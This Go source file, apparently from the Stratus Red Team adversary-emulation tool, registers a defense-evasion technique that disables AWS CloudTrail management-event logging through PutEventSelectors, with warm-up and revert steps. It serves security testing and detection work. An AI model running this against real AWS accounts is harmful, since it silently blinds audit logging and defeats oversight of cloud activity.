package aws

import (
	"context"
	_ "embed"
	"errors"
	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/service/cloudtrail"
	"github.com/aws/aws-sdk-go-v2/service/cloudtrail/types"
	"github.com/datadog/stratus-red-team/internal/providers"
	"github.com/datadog/stratus-red-team/pkg/stratus"
	"github.com/datadog/stratus-red-team/pkg/stratus/mitreattack"
	"log"
)

//go:embed main.tf
var tf []byte

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:                 "aws.defense-evasion.cloudtrail-event-selectors",
		FriendlyName:       "Disable CloudTrail Logging Through Event Selectors",
		Platform:           stratus.AWS,
		MitreAttackTactics: []mitreattack.Tactic{mitreattack.DefenseEvasion},
		Description: `
Disrupt CloudTrail Logging by creating an event selector on the Trail, filtering out all management events.

Reference: https://github.com/RhinoSecurityLabs/Cloud-Security-Research/tree/master/AWS/cloudtrail_guardduty_bypass

Warm-up: 

- Create a CloudTrail trail.

Detonation: 

- Create a CloudTrail event selector to disable management events, through cloudtrail:PutEventSelectors
`,
		IsIdempotent:               true, // cloudtrail:PutEventSelectors is idempotent
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
		Revert:                     revert,
	})
}

func detonate(params map[string]string) error {
	cloudtrailClient := cloudtrail.NewFromConfig(providers.AWS().GetConnection())
	trailName := params["cloudtrail_trail_name"]

	log.Println("Applying event selector on CloudTrail trail " + trailName + " to disable logging management and data events")

	_, err := cloudtrailClient.PutEventSelectors(context.Background(), &cloudtrail.PutEventSelectorsInput{
		TrailName: aws.String(trailName),
		EventSelectors: []types.EventSelector{
			{
				ReadWriteType:           types.ReadWriteTypeReadOnly,
				IncludeManagementEvents: aws.Bool(false),
				DataResources: []types.DataResource{
					{Type: aws.String("AWS::S3::Object"), Values: []string{}},
					{Type: aws.String("AWS::Lambda::Function"), Values: []string{}},
				},
			},
		},
	})

	if err != nil {
		return errors.New("unable to apply CloudTrail event selector: " + err.Error())
	}

	return nil
}

func revert(params map[string]string) error {
	cloudtrailClient := cloudtrail.NewFromConfig(providers.AWS().GetConnection())
	trailName := params["cloudtrail_trail_name"]

	log.Println("Reverting event selector on CloudTrail trail " + trailName)
	_, err := cloudtrailClient.PutEventSelectors(context.Background(), &cloudtrail.PutEventSelectorsInput{
		TrailName:      aws.String(trailName),
		EventSelectors: []types.EventSelector{{IncludeManagementEvents: aws.Bool(true)}},
	})

	if err != nil {
		return errors.New("unable to apply CloudTrail event selector: " + err.Error())
	}

	return nil
}
